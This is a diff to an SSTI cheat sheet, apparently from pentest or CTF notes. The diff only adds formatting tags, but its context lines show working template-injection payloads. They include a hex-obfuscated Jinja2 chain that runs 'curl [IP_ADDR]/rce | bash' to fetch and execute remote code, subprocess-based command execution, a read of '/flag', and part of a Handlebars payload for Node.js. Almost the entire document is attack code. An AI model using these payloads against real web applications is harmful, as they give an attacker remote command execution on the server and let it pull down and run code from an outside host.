@@ -1,17 +1,19 @@
 # Server-Side Template Injection (SSTI)
 
-```
+{% code overflow="wrap" %}
+```django
 ${{<%[%'"}}%    # Special characteres for detection
 {{7*7}}
 {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl [IP_ADDR]/rce | bash")|attr("read")()}}
 ```
+{% endcode %}
 
 ## Python
 
 ### Jinja2
 
 {% code overflow="wrap" %}
-```bash
+```django
 http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__() }}   # To list all objects
 http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}   # Using subprocess.Popen index in 401 to achieve rce
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
@@ -49,7 +51,8 @@ Ref: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Si
 
 ## Node.js Express middleware
 
-```
+{% code overflow="wrap" %}
+```django
 {{#with "s" as |string|}}
 	{{#with "e"}}
 		{{#with split as |conslist|}}
@@ -70,3 +73,4 @@ Ref: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Si
 	{{/with}}
 {{/with}}
 ```
+{% endcode %}
